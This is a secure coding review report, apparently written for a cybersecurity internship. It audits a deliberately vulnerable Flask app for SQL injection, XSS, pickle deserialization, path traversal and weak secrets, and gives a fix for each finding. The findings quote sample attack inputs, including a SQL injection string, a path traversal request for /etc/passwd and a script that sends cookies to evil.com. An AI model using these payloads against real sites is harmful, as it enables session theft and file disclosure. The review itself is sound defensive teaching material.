# Secure Coding Review — CodeAlpha Task 3

**Application audited:** `vulnerable_app.py` — a small Flask web app handling user registration, login, a dashboard, preference loading, and file download.
**Language / Framework:** Python 3 / Flask
**Review method:** Manual line-by-line inspection, cross-referenced against the [OWASP Top 10 (2021)](https://owasp.org/Top10/).
**Remediated version:** See `secure_app.py` — every fix below is implemented and numbered to match its finding.

---

## Summary

The application contains **7 findings**, ranging from Critical to Low severity. The most serious issues are SQL injection, insecure deserialization, and weak/hardcoded secrets — any one of which could lead to full compromise of user data or the server itself. All findings map to recognized categories in the OWASP Top 10.

| # | Finding | Severity | OWASP Category |
|---|---------|----------|-----------------|
| 1 | Hardcoded secret key | High | A02: Cryptographic Failures |
| 2 | Weak, unsalted password hashing (MD5) | Critical | A02: Cryptographic Failures |
| 3 | SQL Injection (register & login) | Critical | A03: Injection |
| 4 | Reflected XSS on `/dashboard` | High | A03: Injection |
| 5 | Insecure deserialization (`pickle.loads`) | Critical | A08: Software & Data Integrity Failures |
| 6 | Path traversal on `/download` | High | A01: Broken Access Control |
| 7 | Debug mode enabled with public bind address | Medium | A05: Security Misconfiguration |

---

## Findings in Detail

### Finding 1 — Hardcoded Secret Key
**Location:** `app.secret_key = "supersecret123"`
**Risk:** Flask uses the secret key to cryptographically sign session cookies. A hardcoded, guessable key lets an attacker forge valid session cookies, impersonate any user, and bypass authentication entirely — worse still if the code is ever pushed to a public repository.
**Recommendation:** Generate a long random key (`secrets.token_hex(32)`) and load it from an environment variable or secrets manager. Never commit it to source control.

### Finding 2 — Weak, Unsalted Password Hashing
**Location:** `hashlib.md5(password.encode()).hexdigest()`
**Risk:** MD5 is cryptographically broken and fast to brute-force. Without a per-user salt, identical passwords produce identical hashes, making the whole user table vulnerable to precomputed rainbow-table attacks the moment the database leaks.
**Recommendation:** Use a purpose-built password hashing algorithm with built-in salting and a tunable work factor — `werkzeug.security.generate_password_hash` (PBKDF2), `bcrypt`, or `argon2`.

### Finding 3 — SQL Injection
**Location:** Both `register()` and `login()` build SQL queries via f-strings with unsanitized user input.
**Risk:** An attacker can inject SQL through the `username` or `password` fields. For example, submitting `' OR '1'='1` as a username in the login form can bypass authentication entirely, and more advanced payloads could read or modify arbitrary data in the database.
**Recommendation:** Always use parameterized queries (`?` placeholders in SQLite/`sqlite3`), which separate query structure from user data so injected SQL is never executed. Never build SQL with string formatting or concatenation.

### Finding 4 — Reflected Cross-Site Scripting (XSS)
**Location:** `/dashboard` builds HTML with an f-string and passes it to `render_template_string` without escaping.
**Risk:** A request like `/dashboard?name=<script>document.location='//evil.com/steal?c='+document.cookie</script>` would execute attacker-controlled JavaScript in the victim's browser, enabling session hijacking or credential theft.
**Recommendation:** Never build HTML by string concatenation with user input. Use Jinja2's `{{ variable }}` syntax, which auto-escapes by default, or Flask's `escape()` helper if constructing HTML manually.

### Finding 5 — Insecure Deserialization
**Location:** `/load_preferences` calls `pickle.loads()` directly on client-supplied data.
**Risk:** `pickle` can execute arbitrary code during deserialization. A malicious payload sent to this endpoint could run any command on the server — this is effectively a remote code execution vulnerability, one of the most severe classes of bug possible.
**Recommendation:** Never unpickle data from an untrusted source. Use a safe, data-only format like JSON, which cannot execute code when parsed.

### Finding 6 — Path Traversal
**Location:** `/download` joins a user-supplied filename directly into a file path with no validation.
**Risk:** A request like `/download?file=../../../../etc/passwd` could let an attacker read arbitrary files on the server's filesystem, including configuration files, source code, or credentials.
**Recommendation:** Reject filenames containing path separators or `..`, resolve the final absolute path, and verify it is still inside the intended directory before opening it (defense in depth — do both, not just one).

### Finding 7 — Debug Mode & Public Bind Address
**Location:** `app.run(debug=True, host="0.0.0.0")`
**Risk:** Flask's debug mode exposes an interactive in-browser debugger that allows arbitrary Python code execution if an unhandled exception occurs and the debugger is reachable. Combined with binding to `0.0.0.0` (all network interfaces), this could expose that debugger to the entire network or internet.
**Recommendation:** Drive `debug` from an environment variable, default it to `False`, and never enable it in anything resembling a production or externally-reachable environment. Bind to `127.0.0.1` unless the app genuinely needs to be reachable externally, and put a reverse proxy in front of it if it does.

---

## General Secure Coding Recommendations

Beyond the specific findings, this review surfaced a few broader habits worth adopting going forward:

- **Treat all user input as untrusted** — from form fields, query parameters, cookies, and headers — and validate/sanitize it before use, regardless of how trivial the endpoint seems.
- **Use parameterized queries or an ORM** (e.g. SQLAlchemy) rather than hand-building SQL, even for "quick" scripts.
- **Never build HTML, SQL, shell commands, or deserialized objects via string concatenation with user input** — this single habit prevents the majority of injection-class vulnerabilities.
- **Keep secrets out of source control** entirely — use environment variables, `.env` files excluded via `.gitignore`, or a secrets manager.
- **Fail closed, not open** — default to the more restrictive/secure setting (`debug=False`, deny-by-default access control) and require explicit opt-in for anything riskier.
- **Run a static analyzer regularly** — tools like `bandit` (Python-specific) or `semgrep` catch several of these exact patterns automatically and are cheap to add to a CI pipeline.

## Tooling Used

Alongside manual review, `vulnerable_app.py` was scanned with **bandit**, a static analysis tool purpose-built for Python:
```bash
pip install bandit
bandit vulnerable_app.py
```
The scan independently confirmed the manual findings, flagging the hardcoded secret, the SQL string construction, the use of `pickle`, `debug=True`, and binding to all network interfaces — 7 issues total (3 High, 4 Medium/Low severity). Full output is saved in `bandit_scan_output.txt` in this folder.

---

*Prepared as part of the CodeAlpha Cyber Security Internship, Task 3: Secure Coding Review.*
